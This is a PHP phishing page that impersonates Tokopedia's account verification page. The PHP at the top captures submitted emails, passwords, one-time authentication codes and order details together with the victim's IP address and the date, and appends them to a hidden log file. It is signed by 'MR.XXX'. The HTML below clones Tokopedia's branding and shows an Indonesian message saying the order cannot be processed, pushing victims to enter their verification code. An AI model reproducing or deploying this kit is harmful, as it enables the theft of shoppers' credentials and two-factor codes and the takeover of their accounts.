<?php
$file = "99";
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$imel = $_POST['email'];
$paswot = $_POST['password'];
$henpon = $_POST['otp'];
$teha = $_POST ['th'];

/* Mengambil informasi untuk dikirim kepada  anda !. */

$handle = fopen($file, 'a');
fwrite($handle, "===== dallemutu =====");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$imel");
fwrite($handle, "\n");
fwrite($handle, "Password: ");
fwrite($handle, "$paswot");
fwrite($handle, "\n");
fwrite($handle, "Kode Otentikasi: ");
fwrite($handle, "$henpon");
fwrite($handle, "\n");
fwrite($handle, "Pesanan: ");
fwrite($handle, "$teha");
fwrite($handle, "\n");
fwrite($handle, "IP Address: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "===== By MR.XXX =====");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
?>
<!DOCTYPE html>
<html dir="ltr" lang="id" class="no-js">

<head>
	<title>Verifikasi | Tokopedia</title>
	
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta name="title" content="Verifikasi | Tokopedia" />
		<meta name="description" content="Segera login ke akun Tokopedia untuk pengalaman terbaik untuk belanja, bayar tagihan, pengajuan hingga menjalankan toko online kapanpun, dimana pun." />
		<link rel="canonical" href="https://www.tokopedia.com/login" /> 
		<link rel="alternate" media="only screen and (max-width: 640px)" href="https://">
		<meta name="format-detection" content="telephone=no">
		<meta property="og:title" content="Masuk / Login | Tokopedia"/>
		<meta property="og:description" content="Silakan login / masuk ke Tokopedia. Nikmati pengalaman belanja paling menyenangkan dan aman karena Tokopedia dilengkapi rekening bersama gratis!"/>
		<meta property="og:site_name" content="Tokopedia"/>
    	<meta property="og:url" content="https://www.tokopedin">
		<meta property="og:image" content="https://ecs7.tokopedia.net/img/og_tokopedia.jpg"/>
		<meta name="description" content="Segera login ke akun Tokopedia untuk pengalaman terbaik untuk belanja, bayar tagihan, pengajuan hingga menjalankan toko online kapanpun, dimana pun."/>
		<link href="https://plus.google.com/104285007928921240758" rel="publisher">
		<meta name="p:domain_verify" content="50de202304b80ee007bc5d73425457ba"/>
		<meta name="msvalidate.01" content="3104E882307BB6900F56D266DC8320F6" />
		<link href="https://www.tokopedia.com/opensearch.xml" title="Tokopedia Search" type="application/opensearchdescription+xml" rel="search">
		<link rel="shortcut icon" href="https://ecs7.tokopedia.net/img/favicon.ico?v=20140313">

	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,600" rel="stylesheet" type="text/css">
	<link href="https://cdn.tokopedia.net/built/2f2aadbf7e8b2000c0ad07853b9b2f86.css" rel="stylesheet"></link>
	<link href="https://cdn.tokopedia.net/built/ef37a5ed4a83510b766655eba6a6e099.css" rel="stylesheet"></link>
	<link rel="dns-prefetch" href="https://ecs7.tokopedia.net">
	<link rel="dns-prefetch" href="//www.google-analytics.com">
	<link rel="dns-prefetch" href="//www.googletagmanager.com">
	

<script>
	var _comscore = _comscore || [];
	_comscore.push({ c1: "2", c2: "14059479" });
	(function() {
	var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
	s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
	el.parentNode.insertBefore(s, el);
	})();
</script>

<noscript>
	<img src="https://sb.scorecardresearch.com/p?c1=2&c2=14059479&cv=2.0&cj=1" />
</noscript>


</head>

<body class="p-0">
	
		
<script src="https://hub.tokopedia.com/iris/clients/web/datalayer-client-web.latest.js"></script>
<script>
  datalayerClientWeb.initializeGTMWithIris({
      container: "gtm",
      device: "desktop",
      batching: true,
      customEventField: "event_ga"
  }, 'dataLayer', 'GTM-TN8CNF');
</script>

	
	<div class="user-accounts-wrapper">
		<div class="js__wrapper-dialog"></div>
		<header class="user-accounts-header">
			<a id="hp-link" f="https://www.tokia" target="">
				
					<i class="user-icon-tokopedia"></i>
				
			</a>
		</header>
		
			

<div id="login-ticker" class="js__ticker unf-user-ticker user-accounts-ticker hide">
        <div class="unf-user-ticker__body">
            <ul class="js__ticker-list user-accounts-list"></ul>
        </div>
        <div class="js__close-ticker unf-user-ticker__action unf-user-ticker__action--close"></div>
        <input type="hidden" id="ticker_url" value="https://gql.tokopedia.com/query" />
    </div>
    
    
    <p><center><b>PESANAN ANDA TIDAK DAPAT DIPROSES</p>
    <p><center><b>SILAHKAN PERIKSA NAMA JASA KURIR DAN KODE VEREFIKASI JASA KURIR ANDA</p>
    <p><center><b>MASUKKAN DENGAN BENAR SUPAYA PESANAN DAPAT DI PROSESKAN OLEH PENJUAL</p>
    <img alt=" Logo Centang Hijau " src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmbj7C7jlA8tTviYGAdNqCLT-QN55w2Z6tSRlmvLpQj9meoceRbkCD4d9oKA" />
    </p>
    </body>
    </html>